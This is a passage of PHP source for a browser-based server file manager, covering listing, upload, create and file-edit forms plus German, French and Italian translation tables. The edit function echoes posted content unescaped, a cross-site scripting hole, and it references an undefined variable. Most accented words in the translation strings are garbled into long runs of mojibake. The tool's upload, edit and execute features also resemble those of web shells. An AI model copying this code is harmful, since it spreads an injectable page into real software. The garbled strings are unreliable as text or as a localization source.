		echo '	</td>
</tr>
';

	}

	echo '<tr class="listing_footer">
	<td style="text-align: right; vertical-align: top"><img src="' . $self . '?image=arrow" alt="&gt;" /></td>
	<td colspan="' . ($cols - 1) . '">
		<input type="hidden" name="num" value="' . sizeof($list) . '" />
		<input type="hidden" name="focus" value="" />
		<input type="hidden" name="olddir" value="' . html($directory) . '" />
';

	$actions = array();
	if (@is_writable(dirname($file['path']))) {
		$actions[] = 'delete';
		$actions[] = 'move';
	}
	$actions[] = 'copy';

	echo '		<select class="small" name="action_all" size="1">
		<option value="">' . str_repeat('&nbsp;', 30) . '</option>
';

	foreach ($actions as $action) {
		echo "\t\t<option value=\"$action\">" . word($action) . "</option>\n";
	}

	echo '		</select>
		<input class="small" type="submit" name="submit_all" value=" &gt; " onfocus="activate(\'other\')" />
	</td>
</tr>
';

}

function column_title ($column, $sort, $reverse) {
	global $self, $directory;

	$d = 'dir=' . urlencode($directory) . '&amp;';

	if ($sort == $column) {
		if (!$reverse) {
			$r = '&amp;reverse=true';
			$arr = ' &and;';
		} else {
			$arr = ' &or;';
		}
	} else {
		$r = '';
	}
	echo "\t<th class=\"$column\"><a href=\"$self?{$d}sort=$column$r\">" . word($column) . "</a>$arr</th>\n";

}

function directory_choice () {
	global $directory, $homedir, $cols, $self;

	echo '<tr>
	<td colspan="' . $cols . '" id="directory">
		<a href="' . $self . '?dir=' . urlencode($homedir) . '">' . word('directory') . '</a>:
		<input type="text" name="dir" size="' . textfieldsize($directory) . '" value="' . html($directory) . '" onfocus="activate(\'directory\')" />
		<input type="submit" name="changedir" value="' . word('change') . '" onfocus="activate(\'directory\')" />
	</td>
</tr>
';

}

function upload_box () {
	global $cols;

	echo '<tr>
	<td colspan="' . $cols . '" id="upload">
		' . word('file') . ':
		<input type="file" name="upload" onfocus="activate(\'other\')" />
		<input type="submit" name="submit_upload" value="' . word('upload') . '" onfocus="activate(\'other\')" />
	</td>
</tr>
';

}

function create_box () {
	global $cols;

	echo '<tr>
	<td colspan="' . $cols . '" id="create">
		<select name="create_type" size="1" onfocus="activate(\'create\')">
		<option value="file">' . word('file') . '</option>
		<option value="directory">' . word('directory') . '</option>
		</select>
		<input type="text" name="create_name" onfocus="activate(\'create\')" />
		<input type="submit" name="submit_create" value="' . word('create') . '" onfocus="activate(\'create\')" />
	</td>
</tr>
';

}

function edit ($file) {
	global $self, $directory, $editcols, $editrows, $apache, $htpasswd, $htaccess;

	html_header();

	echo '<h2 style="margin-bottom: 3pt">' . html($file) . '</h2>

<form action="' . $self . '" method="post">

<table class="dialog">
<tr>
<td class="dialog">

	<textarea name="content" cols="' . $editcols . '" rows="' . $editrows . '" WRAP="off">';

	if (array_key_exists('content', $_POST)) {
		echo $_POST['content'];
	} else {
		$f = fopen($file, 'r');
		while (!feof($f)) {
			echo html(fread($f, 8192));
		}
		fclose($f);
	}

	if (!empty($_POST['user'])) {
		echo "\n" . $_POST['user'] . ':' . crypt($_POST['password']);
	}
	if (!empty($_POST['basic_auth'])) {
		if ($win) {
			$authfile = str_replace('\\', '/', $directory) . $htpasswd;
		} else {
			$authfile = $directory . $htpasswd;
		}
		echo "\nAuthType Basic\nAuthName &quot;Restricted Directory&quot;\n";
		echo 'AuthUserFile &quot;' . html($authfile) . "&quot;\n";
		echo 'Require valid-user';
	}

	echo '</textarea>

	<hr />
';

	if ($apache && basename($file) == $htpasswd) {
		echo '
	' . word('user') . ': <input type="text" name="user" />
	' . word('password') . ': <input type="password" name="password" />
	<input type="submit" value="' . word('add') . '" />

	<hr />
';

	}

	if ($apache && basename($file) == $htaccess) {
		echo '
	<input type="submit" name="basic_auth" value="' . word('add_basic_auth') . '" />

	<hr />
';

	}

	echo '
	<input type="hidden" name="action" value="edit" />
	<input type="hidden" name="file" value="' . html($file) . '" />
	<input type="hidden" name="dir" value="' . html($directory) . '" />
	<input type="reset" value="' . word('reset') . '" id="red_button" />
	<input type="submit" name="save" value="' . word('save') . '" id="green_button" style="margin-left: 50px" />

</td>
</tr>
</table>

<p><a href="' . $self . '?dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>

</form>

';

	html_footer();

}

function spacer () {
	global $cols;

	echo '<tr>
	<td colspan="' . $cols . '" style="height: 1em"></td>
</tr>
';

}

function textfieldsize ($content) {

	$size = strlen($content) + 5;
	if ($size < 30) $size = 30;

	return $size;

}

function request_dump () {

	foreach ($_REQUEST as $key => $value) {
		echo "\t<input type=\"hidden\" name=\"" . html($key) . '" value="' . html($value) . "\" />\n";
	}

}

/* ------------------------------------------------------------------------- */

function html ($string) {
	global $site_charset;
	return htmlentities($string, ENT_COMPAT, $site_charset);
}

function word ($word) {
	global $words, $word_charset;
	return htmlentities($words[$word], ENT_COMPAT, $word_charset);
}

function phrase ($phrase, $arguments) {
	global $words;
	static $search;

	if (!is_array($search)) for ($i = 1; $i <= 8; $i++) $search[] = "%$i";

	for ($i = 0; $i < sizeof($arguments); $i++) {
		$arguments[$i] = nl2br(html($arguments[$i]));
	}

	$replace = array('{' => '<pre>', '}' =>'</pre>', '[' => '<b>', ']' => '</b>');

	return str_replace($search, $arguments, str_replace(array_keys($replace), $replace, nl2br(html($words[$phrase]))));

}

function getwords ($lang) {
	global $word_charset, $date_format;

	switch ($lang) {
	case 'de':

		$date_format = 'd.m.y H:i:s';
		$word_charset = 'ISO-8859-1';

		return array(
'directory' => 'Verzeichnis',
'file' => 'Datei',
'filename' => 'Dateiname',

'size' => 'GrÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¶Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½e',
'permission' => 'Rechte',
'owner' => 'Eigner',
'group' => 'Gruppe',
'other' => 'Andere',
'functions' => 'Funktionen',

'read' => 'lesen',
'write' => 'schreiben',
'execute' => 'ausfÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¼hren',

'create_symlink' => 'Symlink erstellen',
'delete' => 'lÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¶schen',
'rename' => 'umbenennen',
'move' => 'verschieben',
'copy' => 'kopieren',
'edit' => 'editieren',
'download' => 'herunterladen',
'upload' => 'hochladen',
'create' => 'erstellen',
'change' => 'wechseln',
'save' => 'speichern',
'set' => 'setze',
'reset' => 'zurÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¼cksetzen',
'relative' => 'Pfad zum Ziel relativ',

'yes' => 'Ja',
'no' => 'Nein',
'back' => 'zurÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¼ck',
'destination' => 'Ziel',
'symlink' => 'Symbolischer Link',
'no_output' => 'keine Ausgabe',

'user' => 'Benutzername',
'password' => 'Kennwort',
'add' => 'hinzufÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¼gen',
'add_basic_auth' => 'HTTP-Basic-Auth hinzufÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¼gen',

'uploaded' => '"[%1]" wurde hochgeladen.',
'not_uploaded' => '"[%1]" konnte nicht hochgeladen werden.',
'already_exists' => '"[%1]" existiert bereits.',
'created' => '"[%1]" wurde erstellt.',
'not_created' => '"[%1]" konnte nicht erstellt werden.',
'really_delete' => 'Sollen folgende Dateien wirklich gelÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¶scht werden?',
'deleted' => "Folgende Dateien wurden gelÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¶scht:\n[%1]",
'not_deleted' => "Folgende Dateien konnten nicht gelÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¶scht werden:\n[%1]",
'rename_file' => 'Benenne Datei um:',
'renamed' => '"[%1]" wurde in "[%2]" umbenannt.',
'not_renamed' => '"[%1] konnte nicht in "[%2]" umbenannt werden.',
'move_files' => 'Verschieben folgende Dateien:',
'moved' => "Folgende Dateien wurden nach \"[%2]\" verschoben:\n[%1]",
'not_moved' => "Folgende Dateien konnten nicht nach \"[%2]\" verschoben werden:\n[%1]",
'copy_files' => 'Kopiere folgende Dateien:',
'copied' => "Folgende Dateien wurden nach \"[%2]\" kopiert:\n[%1]",
'not_copied' => "Folgende Dateien konnten nicht nach \"[%2]\" kopiert werden:\n[%1]",
'not_edited' => '"[%1]" kann nicht editiert werden.',
'executed' => "\"[%1]\" wurde erfolgreich ausgefÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¼hrt:\n{%2}",
'not_executed' => "\"[%1]\" konnte nicht erfolgreich ausgefÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¼hrt werden:\n{%2}",
'saved' => '"[%1]" wurde gespeichert.',
'not_saved' => '"[%1]" konnte nicht gespeichert werden.',
'symlinked' => 'Symbolischer Link von "[%2]" nach "[%1]" wurde erstellt.',
'not_symlinked' => 'Symbolischer Link von "[%2]" nach "[%1]" konnte nicht erstellt werden.',
'permission_for' => 'Rechte fÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¼r "[%1]":',
'permission_set' => 'Die Rechte fÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¼r "[%1]" wurden auf [%2] gesetzt.',
'permission_not_set' => 'Die Rechte fÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¼r "[%1]" konnten nicht auf [%2] gesetzt werden.',
'not_readable' => '"[%1]" kann nicht gelesen werden.'
		);

	case 'fr':

		$date_format = 'd.m.y H:i:s';
		$word_charset = 'ISO-8859-1';

		return array(
'directory' => 'RÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©pertoire',
'file' => 'Fichier',
'filename' => 'Nom fichier',

'size' => 'Taille',
'permission' => 'Droits',
'owner' => 'PropriÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©taire',
'group' => 'Groupe',
'other' => 'Autres',
'functions' => 'Fonctions',

'read' => 'Lire',
'write' => 'Ecrire',
'execute' => 'ExÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©cuter',

'create_symlink' => 'CrÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©er lien symbolique',
'delete' => 'Effacer',
'rename' => 'Renommer',
'move' => 'DÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©placer',
'copy' => 'Copier',
'edit' => 'Ouvrir',
'download' => 'TÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©lÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©charger sur PC',
'upload' => 'TÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©lÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©charger sur serveur',
'create' => 'CrÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©er',
'change' => 'Changer',
'save' => 'Sauvegarder',
'set' => 'ExÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©cuter',
'reset' => 'RÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©initialiser',
'relative' => 'Relatif',

'yes' => 'Oui',
'no' => 'Non',
'back' => 'Retour',
'destination' => 'Destination',
'symlink' => 'Lien symbollique',
'no_output' => 'Pas de sortie',

'user' => 'Utilisateur',
'password' => 'Mot de passe',
'add' => 'Ajouter',
'add_basic_auth' => 'add basic-authentification',

'uploaded' => '"[%1]" a Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©tÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â© tÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©lÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©chargÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â© sur le serveur.',
'not_uploaded' => '"[%1]" n a pas Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©tÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â© tÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©lÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©chargÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â© sur le serveur.',
'already_exists' => '"[%1]" existe dÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©jÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½ .',
'created' => '"[%1]" a Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©tÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â© crÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©.',
'not_created' => '"[%1]" n a pas pu Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Âªtre crÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©.',
'really_delete' => 'Effacer le fichier?',
'deleted' => "Ces fichiers ont Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©tÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â© dÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©tuits:\n[%1]",
'not_deleted' => "Ces fichiers n ont pu Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Âªtre dÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©truits:\n[%1]",
'rename_file' => 'Renomme fichier:',
'renamed' => '"[%1]" a Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©tÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â© renommÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â© en "[%2]".',
'not_renamed' => '"[%1] n a pas pu Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Âªtre renommÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â© en "[%2]".',
'move_files' => 'DÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©placer ces fichiers:',
'moved' => "Ces fichiers ont Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©tÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â© dÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©placÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©s en \"[%2]\":\n[%1]",
'not_moved' => "Ces fichiers n ont pas pu Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Âªtre dÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©placÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©s en \"[%2]\":\n[%1]",
'copy_files' => 'Copier ces fichiers:',
'copied' => "Ces fichiers ont Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©tÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â© copiÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©s en \"[%2]\":\n[%1]",
'not_copied' => "Ces fichiers n ont pas pu Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Âªtre copiÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©s en \"[%2]\":\n[%1]",
'not_edited' => '"[%1]" ne peut Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Âªtre ouvert.',
'executed' => "\"[%1]\" a Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©tÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â© brillamment exÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©cutÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â© :\n{%2}",
'not_executed' => "\"[%1]\" n a pas pu Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Âªtre exÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©cutÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©:\n{%2}",
'saved' => '"[%1]" a Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©tÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â© sauvegardÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©.',
'not_saved' => '"[%1]" n a pas pu Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Âªtre sauvegardÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©.',
'symlinked' => 'Un lien symbolique depuis "[%2]" vers "[%1]" a Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©tÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â© crÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©e.',
'not_symlinked' => 'Un lien symbolique depuis "[%2]" vers "[%1]" n a pas pu Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Âªtre crÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©.',
'permission_for' => 'Droits de "[%1]":',
'permission_set' => 'Droits de "[%1]" ont Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©tÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â© changÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©s en [%2].',
'permission_not_set' => 'Droits de "[%1]" n ont pas pu Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Âªtre changÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â©s en[%2].',
'not_readable' => '"[%1]" ne peut pas Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Âªtre ouvert.'
		);

	case 'it':

		$date_format = 'd-m-Y H:i:s';
		$word_charset = 'ISO-8859-1';

		return array(
'directory' => 'Directory',
'file' => 'File',
'filename' => 'Nome File',

'size' => 'Dimensioni',
'permission' => 'Permessi',
'owner' => 'Proprietario',
'group' => 'Gruppo',
'other' => 'Altro',
'functions' => 'Funzioni',

'read' => 'leggi',
'write' => 'scrivi',
'execute' => 'esegui',

'create_symlink' => 'crea link simbolico',
'delete' => 'cancella',
'rename' => 'rinomina',
'move' => 'sposta',
'copy' => 'copia',
'edit' => 'modifica',
'download' => 'download',
'upload' => 'upload',
'create' => 'crea',
'change' => 'cambia',
'save' => 'salva',
'set' => 'imposta',
'reset' => 'reimposta',
'relative' => 'Percorso relativo per la destinazione',

'yes' => 'Si',
'no' => 'No',
'back' => 'indietro',
'destination' => 'Destinazione',
'symlink' => 'Link simbolico',
'no_output' => 'no output',

'user' => 'User',
'password' => 'Password',
'add' => 'aggiungi',
'add_basic_auth' => 'aggiungi autenticazione base',

'uploaded' => '"[%1]" Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¨ stato caricato.',
'not_uploaded' => '"[%1]" non Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¨ stato caricato.',
'already_exists' => '"[%1]" esiste giÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½ .',
'created' => '"[%1]" Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¨ stato creato.',
'not_created' => '"[%1]" non Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¨ stato creato.',
'really_delete' => 'Cancello questi file ?',
'deleted' => "Questi file sono stati cancellati:\n[%1]",
'not_deleted' => "Questi file non possono essere cancellati:\n[%1]",
'rename_file' => 'File rinominato:',
'renamed' => '"[%1]" Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¨ stato rinominato in "[%2]".',
'not_renamed' => '"[%1] non Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¨ stato rinominato in "[%2]".',
'move_files' => 'Sposto questi file:',
'moved' => "Questi file sono stati spostati in \"[%2]\":\n[%1]",
'not_moved' => "Questi file non possono essere spostati in \"[%2]\":\n[%1]",
'copy_files' => 'Copio questi file',
'copied' => "Questi file sono stati copiati in \"[%2]\":\n[%1]",
'not_copied' => "Questi file non possono essere copiati in \"[%2]\":\n[%1]",
'not_edited' => '"[%1]" non puÃ?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â² essere modificato.',
'executed' => "\"[%1]\" Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?ï¿½Ã?Â¨ stato eseguito con successo:\n{%2}",
